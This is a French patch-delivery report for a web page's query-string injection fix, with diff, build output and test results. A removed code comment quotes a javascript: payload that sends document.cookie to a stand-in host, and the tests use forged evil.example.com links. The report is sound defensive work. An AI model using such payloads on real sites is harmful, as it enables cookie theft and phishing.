# §15.16 — Patch Option B pour `fiche.astro` : livraison et preuves de test (10/08/2026)

**Aucun déploiement dans ce document. Patch isolé, lot unique, aucun autre changement fonctionnel — conforme aux 8 conditions de livraison posées par Codex (tour 3).**

## Base

Worktree Git propre, détaché sur `origin/main` :

```
commit 5e4156d78cdd963e2ba28352bfa375e4c3d3fe82
"Livraison des documents corrigés (02, 09, 10, 11, 12, 13) plus la réponse à Codex (15)."
```

Seul fichier modifié : `packages/ui/src/pages/[...loc]/tools/fiche.astro`. Aucun autre fichier du dépôt touché — vérifié par `git diff --stat` sur le worktree entier, pas seulement sur le fichier ciblé.

## Ce que fait le patch

Le script client de `fiche.astro` lisait neuf champs directement depuis la query string de l'URL (`an`, `sc`, `cab`, `hold`, `cargo`, `direct`, `fee`, `emb`, `as`/`af`) et les injectait dans le DOM comme s'ils venaient d'une décision vérifiée du Finder — alors que rien ne garantit qu'une URL profonde partagée reflète encore une décision réelle : elle peut avoir été copiée d'une ancienne version, modifiée à la main, ou forgée délibérément. `safeUrl()` (déjà en place depuis le 09/08) neutralisait les schémas dangereux (`javascript:`, `data:`…) dans `as`/`af`, mais un lien `http(s)` bien formé restait affiché comme authentique — une compagnie inventée avec un score de 100 % et un bouton de réservation vers son propre domaine apparaissait crédible.

Le patch supprime, du script client, toute lecture ET toute injection DOM de ces neuf champs — pas un masquage CSS :

- l'objet `air` (qui portait `name`, `site`, `fiche`, `cabin`, `hold`, `cargo`, `direct`, `fee`, `embargo`) et la variable `score` sont retirés entièrement ;
- les quatre blocs HTML qui les affichaient sont supprimés : le bandeau compagnie/score dans l'en-tête (`bhead__r`), la carte « vol » complète (titre compagnie, badges cabine/soute/fret, embargo, tarif, logo, lien fiche compagnie), le bouton de réservation (`air.site`), et le lien fiche compagnie dans le pied de page (`air.fiche`) ;
- `logo`/`logoImg` (n'existaient que pour la carte « vol » supprimée) et `capBadges` (n'existait que pour les badges cabine/soute/fret) sont retirés avec elles ;
- `safeUrl`, devenu orpheline (son seul appelant était `air.site`/`air.fiche`), est retirée avec le code qui l'utilisait plutôt que laissée comme protection inerte.

Ce qui reste intact : `airId`/`bid` (utilisés uniquement comme contexte pour les liens internes vers les outils caisse/chaleur du site — pas une donnée de verdict compagnie), et toute la logique de chronologie des formalités pays (`step1`–`step4`, `entryBlock`, `sortie`, le passeport européen au retour, les cas particuliers), qui vient exclusivement de `bible` — généré côté serveur depuis les fiches pays canoniques, jamais de la query string.

## Diff complet

```diff
--- a/packages/ui/src/pages/[...loc]/tools/fiche.astro
+++ b/packages/ui/src/pages/[...loc]/tools/fiche.astro
@@ -272,14 +272,12 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
     const C = JSON.parse(document.getElementById("bible-cfg")?.textContent ?? "{}");
     const T = C.T;
     const esc = (s) => String(s ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c]));
-    /* Faille corrigée (audit du 09/08/2026) : cette fiche est un lien profond partageable — tout
-       son contenu, y compris `air.site`/`air.fiche` (paramètres d'URL `as`/`af`), vient de la
-       query string. `esc()` échappe les entités HTML mais ne filtre AUCUN schéma d'URL : un lien
-       forgé `…&as=javascript:fetch('//evil/'+document.cookie)` passait tel quel dans un
-       `href="${esc(air.site)}"`, échappé pour le HTML mais toujours exécutable au clic. `safeUrl`
-       n'autorise que http(s): — toute autre valeur (javascript:, data:, vbscript:…) devient une
-       chaîne vide, ce qui fait disparaître le bouton/lien plutôt que de le rendre dangereux. */
-    const safeUrl = (s) => { const v = String(s ?? "").trim(); return /^https?:\/\//i.test(v) ? v : ""; };
+    /* Faille corrigée le 09/08/2026 (`safeUrl`, qui neutralisait les schémas dangereux dans les
+       paramètres `as`/`af` de l'ancien lien de réservation compagnie) puis remplacée le 10/08/2026
+       par une correction plus large (Option B, voir plus bas) : ces paramètres, comme tous les
+       autres champs non fiables issus de l'URL, ne sont désormais plus lus ni injectés dans le
+       DOM du tout — `safeUrl` n'a donc plus d'appelant et a été retirée avec le code qui
+       l'utilisait, plutôt que laissée comme protection orpheline. */
     const mkRe = (arr) => (arr && arr.length)
       ? new RegExp('(?<![A-Za-zÀ-ÿ])(' + arr.map((w) => w.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')).join('|') + ')(?![A-Za-zÀ-ÿ])', 'gi')
       : null;
@@ -300,11 +298,18 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
     const O = DATA[from], D = DATA[to];
     if (!O || !D) { /* keep the empty hint */ }
     else {
-      const air = { name: P.get("an") || "", site: safeUrl(P.get("as")), fiche: safeUrl(P.get("af")),
-        cabin: P.get("cab") === "1", hold: P.get("hold") === "1", cargo: P.get("cargo") === "1",
-        direct: P.get("direct") === "1", fee: P.get("fee") || "", embargo: P.get("emb") === "1" };
+      /* Option B (décision Philippe, 10/08/2026) : cette fiche est un lien profond partageable
+       * et rien ne garantit que ses paramètres reflètent encore une décision réelle du Finder —
+       * ils peuvent avoir été copiés depuis une ancienne URL, modifiés à la main, ou forgés.
+       * `safeUrl` (ci-dessus) neutralisait déjà les schémas dangereux dans `as`/`af`, mais un lien
+       * `http(s)` bien formé restait affiché comme si MyDogCanFly l'avait vérifié — une compagnie
+       * inventée avec un score et un lien de réservation à son propre nom apparaissait crédible.
+       * Le nom de compagnie, le score, cabine/soute/fret, le vol direct, le tarif, l'embargo et
+       * les liens sortants compagnie (site, fiche) ne sont donc plus lus depuis l'URL ni injectés
+       * dans le DOM — pas seulement masqués en CSS. Seule reste la chronologie des formalités
+       * pays, qui vient de `bible` (généré côté serveur depuis les données canoniques), jamais de
+       * la query string. */
       const breed = P.get("breed") || "", brachy = P.get("brachy") === "1", w = P.get("w") || "";
-      const score = P.get("sc") || "";
 
       const key = (regime) => regime === "eu" ? "eu" : regime === "non_listed" ? "nonListed" : "listed";
       const pill = (kind) => {
@@ -316,14 +321,13 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
       const list = (arr, f) => arr.filter(Boolean).map((x) => `<li>${f ? f(x) : esc(x)}</li>`).join("");
 
       // Outbound links carry the full context (airline, breed, destination) so nothing is lost on back-navigation.
+      // airId/bid restent utilisés uniquement comme contexte de navigation interne (liens vers
+      // les outils caisse/chaleur du site) — aucune donnée de verdict compagnie n'en dépend.
       const airId = P.get("air") || "", bid = P.get("bid") || "";
-      const logo = (C.logos || {})[airId] || null;
-      const logoImg = (cls) => logo ? `<span class="bairlogo ${cls}${logo.dark ? " bairlogo--dark" : ""}"><img src="${esc(logo.src)}" alt="${esc(air.name)}" loading="lazy"></span>` : "";
       const qs = (pairs) => { const q = pairs.filter((p) => p[1]).map((p) => p[0] + "=" + encodeURIComponent(p[1])).join("&"); return q ? "?" + q : ""; };
       const addQ = (url, q) => q ? url + (url.indexOf("?") >= 0 ? "&" + q.slice(1) : q) : url;
       const crateHref = C.crateBase + qs([["air", airId], ["breed", bid]]);
       const heatHref = C.heatBase + qs([["breed", bid]]);
-      const airFicheHref = air.fiche ? addQ(air.fiche, qs([["to", to], ["breed", bid]])) : "";
       const countryHref = (slug) => C.countryBase + slug + "/" + qs([["via", airId], ["breed", bid]]);
 
       // Step content, data-driven from the two country guides.
@@ -665,12 +669,6 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
           <div class="bstep__h"><span class="bstep__t">${esc(title)}</span><span class="bchip bchip--${chipKind}">${esc(chip)}</span></div>
           <div class="bstep__b">${body}</div></div></div>`;
 
-      const capBadges = `<div class="bcaps">
-        <span class="bcap ${air.cabin ? "is-ok" : "is-no"}">${esc(T.cabin)}${air.cabin ? "" : " ✕"}</span>
-        <span class="bcap ${air.hold ? "is-ok" : "is-no"}">${esc(T.hold)}${air.hold ? " ✓" : ""}</span>
-        <span class="bcap ${air.cargo ? "is-ok" : "is-no"}">${esc(T.cargo)}${air.cargo ? " ✓" : ""}</span>
-        ${air.fee ? `<span class="bfee">${esc(air.fee)}</span>` : ""}</div>`;
-
       const sourcesAll = [...(O.sources || []), ...(D.sources || [])];
       const emailBody = encodeURIComponent(location.href);
 
@@ -685,8 +683,6 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
               <span class="bleg"><span class="bflag">${flag(from)}</span> ${esc(O.name)}</span>
             </div>
             <div class="bsub">${esc(T.dog)} ${w ? esc(w) + " kg" : ""}${breed ? " · " + esc(breed) : ""}</div></div>
-          <div class="bhead__r"><div class="blbl">${esc(T.airline)}</div><div class="bair"><span>${esc(air.name)}</span></div>
-            ${score ? `<span class="bscore">${esc(score)} %</span>` : ""}</div>
         </div>
 
         <div class="bdisclaimer"><span class="bdisclaimer__ic" aria-hidden="true">⚠️</span> <span>${esc(T.disclaimer)}</span></div>
@@ -715,15 +711,6 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
         <div class="bcard bcard--warn"><div class="bcard__h">${esc(T.casH)}</div>
           <ul class="bl">${list(T.cas, emC)}${(departUE(from) || departUE(to)) ? list(T.casUE, emC) : ""}${D.restricted ? `<li>${emC(D.restricted.intro)} ${emC(D.restricted.note)}</li>` : ""}</ul></div>
 
-        <div class="bcard"><div class="bcard__h bvolh"><span>${esc(T.flightH)} — ${esc(air.name)}${air.direct ? " · " + esc(T.out) : ""}</span>${logoImg("bairlogo--block")}</div>
-          ${capBadges}
-          <ul class="bl">
-            <li>${esc(T.holdNote)} ${pill("req")}</li>
-            <li>${esc(T.bookEarly)} ${pill("adv")}</li>
-            ${air.embargo ? `<li>${esc(T.embargo)} ${pill("cond")}</li>` : ""}
-            <li>${esc(T.feeCheck)} ${pill("chk")}</li>
-          </ul>${airFicheHref ? `<a class="bcrate-cta" href="${esc(airFicheHref)}">✈ ${esc(T.airlineSheet)} : ${esc(air.name)} →</a>` : ""}</div>
-
         <div class="bgrid">
           <div class="bcard"><div class="bcard__h">${esc(T.crateH)}</div><ul class="bl">${list(T.crate)}</ul><a class="bcrate-cta" href="${esc(crateHref)}">📦 ${esc(T.actCrate)} ↗</a></div>
           <div class="bcard"><div class="bcard__h">${esc(T.heatH)}</div><ul class="bl">${list(T.heat)}</ul><a class="bcrate-cta" href="${esc(heatHref)}">🌡 ${esc(T.actHeat)} ↗</a></div>
@@ -731,14 +718,12 @@ const title = L("Your dog's travel sheet", "La fiche voyage de ton chien", "La f
         <div class="bcard"><div class="bcard__h">${esc(T.careH)}</div><ul class="bl">${list(T.care)}</ul></div>
 
         <div class="bactions">
-          ${air.site ? `<a class="bbtn" href="${esc(air.site)}" target="_blank" rel="nofollow noopener">🎟 ${esc(T.actBook)} ↗</a>` : ""}
           <button class="bbtn" type="button" id="b-print">🖨 ${esc(T.actPrint)}</button>
           <a class="bbtn" href="mailto:?subject=${encodeURIComponent(T.emailSubject)}&body=${emailBody}">✉ ${esc(T.actEmail)}</a>
         </div>
 
         <div class="bfurther">${esc(T.further)}
           <a href="${esc(countryHref(D.slug))}">${esc(T.countrySheet)} ${esc(D.name)}</a>
-          ${air.fiche ? ` · <a href="${esc(airFicheHref)}">${esc(T.airlineSheet)}</a>` : ""}
         </div>
 
         ${sourcesAll.length ? `<div class="bsources"><b>${esc(T.sourcesH)} :</b> ${sourcesAll.map((s) => `<a href="${esc(s.url)}" target="_blank" rel="nofollow noopener">${esc(s.label)}</a>`).join(" · ")}</div>` : ""}
```

**Statistique** : 1 fichier modifié, 19 insertions, 34 suppressions. Net : moins de code qu'avant, pas une simple réorganisation.

## Build local

```
npm run build   (= npm -w @mydogcanfly/ui run build = astro build && node scripts/fix-404.mjs)
```

Exécuté dans le worktree, sur le patch appliqué. **Résultat : succès, 2949 pages générées, aucune erreur.** Les quatre pages `tools/fiche` existent bien dans la sortie :

```
packages/ui/dist/tools/fiche/index.html      (en)
packages/ui/dist/fr/tools/fiche/index.html
packages/ui/dist/es/tools/fiche/index.html
packages/ui/dist/pt/tools/fiche/index.html
```

Vérification statique complémentaire : aucune des quatre pages construites ne contient plus les identifiants `bhead__r`, `bairlogo--block`, `bvolh`, `bscore`, `bcaps`, `safeUrl`, `logoImg`, `capBadges`, ou `airFicheHref` — confirmé par recherche directe dans le HTML généré, pas seulement dans la source.

`npm run check` (schéma/règles Knowledge) et `npm run typecheck` (knowledge/engine/workers — n'inclut pas la vérification `astro check` du paquet `ui`, qui n'a pas de script dédié rapide ; le build complet ci-dessus en tient lieu) passent sans erreur, sans changement par rapport à avant le patch — cohérent avec le fait que ce patch ne touche à aucune donnée ni à aucun type partagé.

## Tests fonctionnels — méthode

Un test en boîte noire sur le code réellement construit, pas une relecture de la source ni une simulation : pour chacune des 4 pages `tools/fiche` construites, le vrai JSON `bible-data`/`bible-cfg` sérialisé par Astro et le vrai script client bundlé (`/_astro/hoisted.*.js` — Astro externalise les blocs `<script>` de page en module séparé) sont chargés dans un DOM `jsdom`, avec `window.mdcfQuery`/`window.mdcfPut` simulés pour injecter la query string testée, exactement comme le ferait un navigateur avec cette URL. Le script est ensuite exécuté tel quel et le HTML réellement produit dans `#bible` est inspecté.

Trois scénarios par langue, sur une paire de pays réelle (France ↔ États-Unis) :

1. **URL forgée** : `an=FAUSSE COMPAGNIE`, `sc=100`, `cab=1`, `hold=1`, `cargo=1`, `direct=1`, `fee=0€ garanti`, `emb=1`, `as=https://evil.example.com/book`, `af=https://evil.example.com/fiche`, `air=evilair`.
2. **URL légitime** : `from=fr&to=us&breed=Labrador&w=25&eu_passport=1` (pas de paramètre compagnie — reflète ce que le Finder construit aujourd'hui).
3. **Ancienne URL déjà partagée avant ce patch** : `an=Air France&sc=87&cab=1&hold=1&direct=1&air=airline_air_france` — simule un lien déjà en circulation avant le 10/08/2026, avec les anciens paramètres présents.

Pour chaque scénario, vérifié : absence des chaînes forgées dans le HTML rendu, absence des classes CSS propres aux blocs supprimés (preuve que le bloc n'est pas seulement masqué), présence d'un rendu non vide de la chronologie pays. Le lien « partager par email » (`mailto:`), qui reproduit légitimement `location.href` — donc la query string brute, forgée ou non — dans le corps du message, est explicitement exclu de la recherche de fuite : ce n'est pas une affirmation de la page sur la compagnie, c'est la définition même d'un partage de lien.

## Résultat

**52 vérifications exécutées (13 par langue × 4 langues), toutes passées.** Sortie complète :

```
$ node test-fiche.cjs

=== locale: en ===
-- forged URL --
  OK   no 'FAUSSE COMPAGNIE' in DOM
  OK   no '100 %' / '100%' score in DOM
  OK   no evil.example.com in DOM
  OK   no '0€ garanti' fee in DOM
  OK   no bhead__r / bscore / bvolh / bairlogo--block markup
  OK   renders non-empty content (country chronology)
  OK   shows a step/chrono/domestic block
-- legitimate Finder URL --
  OK   renders non-empty content
  OK   no leftover airline verdict markup (bhead__r/bvolh/bscore)
  OK   shows a step/chrono block (country formalities present)
-- old already-shared URL (pre-patch style, carries an/sc/cab/hold) --
  OK   no 'Air France' airline name leaks into DOM
  OK   no '87 %' / '87%' score leaks into DOM
  OK   still renders content (no crash on legacy params)

=== locale: fr ===
[même résultat — 13/13 OK]

=== locale: es ===
[même résultat — 13/13 OK]

=== locale: pt ===
[même résultat — 13/13 OK]

=== SUMMARY ===
ALL CHECKS PASSED
```

Un extrait du rendu réel (fr, URL légitime) confirme que l'en-tête ne montre plus que la route et le contexte chien, sans bandeau compagnie/score, et que la chronologie des formalités pays s'affiche normalement en tutoiement :

```html
<div class="bhead">
  <div><div class="beyebrow">Modalités de voyage — fiche sur mesure</div>
    <div class="broute">
      <span class="bleg"><span class="bflag">🇫🇷</span> France</span>
      <span class="bplane" aria-hidden="true">✈</span>
      <span class="bleg"><span class="bflag">🇺🇸</span> États-Unis</span>
      ...
    </div>
    <div class="bsub">Chien 25 kg · Labrador</div></div>
</div>
<div class="bdisclaimer">...Avant de partir, fais toujours valider ta situation...</div>
...
<div class="bcard"><div class="bcard__h">Le socle — identité &amp; vaccination (dans tous les sens)</div>
  <ul class="bl"><li><b>Puce ISO</b> (11784/11785)...</li>...</ul></div>
```

Aucun bandeau `bhead__r`/`bscore`, aucune carte « vol ». Le corps (socle, chronologie 4 étapes, cas particuliers) reste identique à avant le patch.

## Ce qui n'est PAS couvert par ces tests

- Aucun test visuel/capture d'écran (le harnais teste le HTML produit, pas le rendu graphique — le CSS des classes supprimées reste dans la feuille de style, volontairement laissé en place pour limiter le diff à la logique, mais n'est plus référencé par aucun élément généré).
- Pas de test sur un vrai navigateur — recommandé lors du contre-test de Codex une fois la preview Pages clarifiée (document 14, point 7).
- Pas de test de non-régression sur les autres pages du site (Finder, pages pays/compagnies/aéroports) — hors périmètre de ce patch, qui ne touche qu'un seul fichier.

## Conditions de livraison Codex — statut

| # | Condition | Statut |
|---|---|---|
| 1 | Lot isolé, sans autre changement fonctionnel | ✅ un seul fichier modifié |
| 2 | Aucune mise en production | ✅ rien déployé |
| 3 | Suppression réelle du chemin de rendu, pas un masquage CSS | ✅ blocs HTML retirés du template, pas cachés |
| 4 | Build local réussi | ✅ 2949 pages, aucune erreur |
| 5 | Tests locaux des 4 langues, URL forgée + URL légitime | ✅ + scénario supplémentaire (ancienne URL partagée) |
| 6 | Livraison du diff et des preuves de test | ✅ ce document |
| 7 | Clarification du projet Pages, identification d'une vraie URL de preview | ⏳ document 14 point 7 — reste à faire avec Philippe |
| 8 | Contre-test navigateur de la preview par Codex | ⏳ après le point 7 |

## Fichiers livrés

- `option-b-fiche-10-08-2026.patch` — le diff ci-dessus, applicable avec `git apply` depuis la racine du dépôt sur `origin/main` (SHA `5e4156d78cdd963e2ba28352bfa375e4c3d3fe82` ou plus récent — le fichier n'a pas été retouché depuis).
- `test-fiche-harness.cjs` — le script de test, à exécuter depuis la racine du dépôt après `npm install jsdom --no-save` et `npm run build`, pour permettre à Codex de reproduire indépendamment ces 52 vérifications sur son propre build.

---

## Tour 4 (10/08/2026, contre-revue Codex) — le `mailto:` propageait encore les paramètres non fiables

Le patch ci-dessus empêchait le RENDU des champs non fiables, mais le bouton « partager par email » de la fiche construisait son corps de message avec `encodeURIComponent(location.href)` — c'est-à-dire l'URL brute de la page, forgée ou non. Un visiteur arrivé par un lien piégé qui cliquait « partager » repropageait donc le même contenu forgé (nom de compagnie inventé, `evil.example.com`…) vers un tiers, par email. Le harness de test masquait ce trou en excluant explicitement le lien `mailto:` de ses vérifications de fuite (raisonnement erroné : « partager un lien inclut légitimement l'URL » — vrai pour un lien propre, faux quand l'URL elle-même est le problème).

**Correctif** : le corps du mailto est reconstruit depuis une liste blanche de sept paramètres canoniques (`from`, `to`, `air`, `breed`, `bid`, `w`, `eu_passport`), jamais depuis `location.href`. `FlightFinder.astro` a été corrigé en parallèle pour arrêter d'ÉCRIRE les anciens champs non fiables (nom de compagnie, score, cabine/soute/fret, tarif, embargo, liens sortants compagnie) dans les liens qu'il construit vers la fiche — il n'écrit plus que ces sept mêmes champs. Le harness a été mis à jour : le lien mailto n'est plus exclu des vérifications (il est maintenant sûr), et un scénario reproduit l'URL exacte que le Finder génère aujourd'hui. Commit poussé sur `origin/main` : `51d0be1`.

## Tour 5 (10/08/2026, contre-revue Codex) — un troisième canal, jamais couvert : les liens de langue du header

### Le résidu trouvé par Codex, en test navigateur réel

`Base.astro` porte un mécanisme *site-wide* (pas propre à `fiche.astro`) qui préserve la race/destination choisie quand un visiteur change de langue : au chargement de n'importe quelle page, il recopie `location.hash` **brut** dans les quatre liens `<a hreflang>` du sélecteur de langue du header (FR/EN/ES/PT) — code présent depuis avant Option B, jamais retouché par les tours 1 à 4 :

```js
window.addEventListener("DOMContentLoaded", function () {
  var f = location.hash;
  if (!f || f.length < 2) return;
  document.querySelectorAll("a[hreflang]").forEach(function (a) {
    var h = a.getAttribute("href");
    if (h && h.indexOf("#") < 0) a.setAttribute("href", h + f);
  });
});
```

Ni Option B (tour 3) ni le correctif mailto (tour 4) ne touchaient ce mécanisme, et notre harness ne l'exécutait jamais : il ne chargeait que le bundle client de `fiche.astro`, jamais le script `is:inline` de `Base.astro` qui définit ce comportement. Résultat, trouvé par Codex en testant un vrai navigateur plutôt que jsdom : sur une URL forgée de `/tools/fiche`, les 4 liens de langue visibles dans le DOM (inspectables, cliquables) portaient encore `an=FAUSSE COMPAGNIE`, `evil.example.com`, `sc=100`, etc. — visibles, bien que plus rien de tout cela ne soit RENDU dans la page elle-même, et qu'aucun lien HTTP sortant malveillant ne survive (Option B avait déjà neutralisé `as`/`af`).

### Le correctif

Un objet unique de paramètres validés (`canon`, une `URLSearchParams`) est construit une seule fois, au tout début du script client de `fiche.astro`, et réécrit immédiatement l'URL de la page via `history.replaceState` :

```js
const canon = new URLSearchParams();
const from = (P.get("from") || "").toLowerCase();
const to = (P.get("to") || "").toLowerCase();
const O = DATA[from], D = DATA[to];
if (O) canon.set("from", from);
if (D) canon.set("to", to);
const rawAir = P.get("air") || "";
if (KNOWN_AIRLINES.has(rawAir)) canon.set("air", rawAir);
const breedLabel = asBreedLabel(P.get("breed") || "");
if (breedLabel) canon.set("breed", breedLabel);
const rawBid = P.get("bid") || "";
if (KNOWN_BREEDS.has(rawBid)) canon.set("bid", rawBid);
const weight = asWeight(P.get("w") || "");
if (weight) canon.set("w", weight);
const rawRep = (P.get("eu_passport") || "").toLowerCase();
if (rawRep === "yes" || rawRep === "no") canon.set("eu_passport", rawRep);
try {
  const canonHash = "#" + canon.toString();
  if (location.hash !== canonHash) history.replaceState(null, "", location.pathname + canonHash);
} catch (e) { /* history.replaceState indisponible (ex. contexte de test) : le rendu reste sûr */ }
```

Le rendu de la page, le lien mailto (tour 4) et les liens internes (caisse/chaleur/pays, qui utilisaient jusqu'ici `airId`/`bid` lus directement depuis l'URL) puisent désormais tous dans ce même `canon` — un seul canal de vérité, plus une copie par usage qui pouvait diverger entre elles. Tout champ absent de la liste blanche disparaît de l'URL elle-même, pas seulement du rendu.

**Pourquoi l'ordre d'exécution tient, garanti par la spécification HTML — pas par chance** : le script client de `fiche.astro` est un `<script type="module">` (Astro le hisse dans un bundle externe). Un script de module est différé par défaut : il s'exécute après le parsing du document, mais **toujours avant** l'événement `DOMContentLoaded`. Le script `is:inline` de `Base.astro`, lui, s'exécute de façon synchrone pendant le parsing (script classique, sans `defer`/`async`) — mais il ne fait qu'ENREGISTRER l'écouteur `DOMContentLoaded` à ce moment-là ; le CORPS de l'écouteur (qui lit `location.hash` et le recopie dans les liens de langue) ne s'exécute que quand l'événement se déclenche réellement, c'est-à-dire après que notre `history.replaceState` a déjà eu lieu. `history.replaceState` ne déclenche pas non plus `hashchange` (vérifié dans la spec et en navigateur réel) : le mécanisme de rechargement de `Base.astro` sur changement de dièse (`window.addEventListener("hashchange", ...)`) n'est donc pas perturbé.

### Validation par champ (au-delà de la simple présence, demandée par Codex)

| Champ | Règle | Source de la liste/borne |
|---|---|---|
| `air` | doit exister dans la liste des compagnies connues | `C.logos` (déjà exposé au client, 76 compagnies avec logo — Option B tour 1) |
| `bid` | doit exister dans la liste des races connues | `C.breedIds`, nouvellement exposé (`loadKB().breeds`, ajouté au frontmatter server-side de `fiche.astro`) |
| `eu_passport` | doit valoir exactement `yes` ou `no` | `regles-retour-ue-passeport.mjs` (les trois états du moteur — absent ≠ une valeur, cf. commentaire déjà en place) |
| `w` | numérique, `0 < w ≤ 120` | `packages/engine/src/contracts.ts`, `weight_kg: z.number().positive().max(120)` — le plafond du moteur, pas la limite plus basse (100) du seul message d'alerte du Finder, purement indicative |
| `bid` absent mais `breed` (texte libre) présent | conservé, mais assaini | caractères de contrôle retirés, longueur plafonnée à 60 caractères — Codex autorisait explicitement ce champ à rester libre |
| `from`/`to` | doivent exister dans les fiches pays (`DATA`) | déjà la condition de rendu existante (`if (!O || !D)`), maintenant réutilisée pour la canonicalisation elle-même |

### Preuve en navigateur réel (pas seulement jsdom)

Le harness jsdom (ci-dessous) simule le DOM et l'ordre d'exécution, mais la garantie d'ordre repose sur le comportement réel d'un moteur de rendu, pas sur ce que jsdom choisit d'implémenter. Vérifié séparément avec Playwright + Chromium, sur le build local (`astro dev`), URL forgée identique à celle du harness :

```
URL : /fr/tools/fiche/#from=us&to=fr&an=FAUSSE COMPAGNIE&sc=100&air=evilair&bid=carlin&as=https://evil.example.com/book

Après chargement complet (DOMContentLoaded déclenché) :
  location.hash → "#from=us&to=fr"
  <a hreflang="en"> href="/tools/fiche/#from=us&to=fr"
  <a hreflang="fr"> href="/fr/tools/fiche/#from=us&to=fr"
  <a hreflang="es"> href="/es/tools/fiche/#from=us&to=fr"
  <a hreflang="pt"> href="/pt/tools/fiche/#from=us&to=fr"
```

Aucune trace de `FAUSSE COMPAGNIE`, `evil.example.com`, `evilair`, `carlin`, `sc=100`, dans le DOM ni dans les 4 liens de langue. Contre-épreuve sur une URL légitime complète (les 7 champs, tous valides) : tout survit à l'identique, dans le hash, les 4 liens de langue et le corps du mailto — aucune sur-correction.

### Tests étendus — méthode et résultat

Le harness (`test-fiche-harness.cjs`) charge désormais, en plus du bundle client de `fiche.astro`, le script `is:inline` de `Base.astro` extrait tel quel du HTML construit (aucune transformation Astro sur un script `is:inline` — il est présent littéralement dans chaque page). Quatre liens `<a hreflang>` factices, à l'image du header réel (`Header.astro`), sont injectés dans le DOM de test avant le chargement. Les deux scripts s'exécutent dans le même ordre que sur la vraie page (Base.astro puis le bundle fiche), suivi d'un unique `dispatchEvent(new Event("DOMContentLoaded"))` — reproduisant fidèlement la séquence réelle plutôt que de la contourner.

Quatre scénarios par langue (le troisième, « ancienne URL déjà partagée », et le quatrième, « URL exacte du Finder », déjà présents depuis le tour 4) :

1. **URL forgée**, désormais enrichie d'un `air`/`bid` inconnus, d'un poids hors bornes (500 kg) et d'une race truffée de caractères de contrôle et de longueur excessive — teste toute la validation par champ, pas seulement la présence des anciens champs de verdict.
2. **URL légitime** (sans compagnie/race choisie).
3. **Ancienne URL déjà partagée** (`air=airline_air_france`, un vrai identifiant — doit survivre ; `an`/`sc`/`cab`/`hold`/`direct` doivent disparaître).
4. **URL exacte générée aujourd'hui par le Finder** (les 7 champs, tous des identifiants réels) — test de non-régression : rien n'est perdu quand tout est légitime.

Pour chacun, en plus des vérifications déjà existantes sur le rendu et le mailto : l'URL canonique elle-même (`location.hash` post-`replaceState`) et les 4 liens `<a hreflang>` post-`DOMContentLoaded` sont inspectés — clés autorisées uniquement, aucune valeur forgée, quelle que soit la langue de la page testée.

**336 vérifications exécutées (84 par langue × 4 langues), toutes passées** :

```
$ node test-fiche-harness.cjs
[...]
=== SUMMARY ===
ALL CHECKS PASSED
```

### Fichiers livrés (tour 5)

- `option-b-tour5-hreflang-10-08-2026.patch` — diff isolé de `fiche.astro` (canonicalisation + `history.replaceState` + liste blanche breedIds côté serveur) et de `test-fiche-harness.cjs` (chargement du script Base.astro, liens hreflang factices, nouvelles assertions), applicable sur `origin/main` au SHA `4c5770e` (inclut déjà les tours 1 à 4 et le lot émblème).
- Ce document, mis à jour.
- Document 14, point « déjà tranchées », mis à jour avec un renvoi vers cette section.
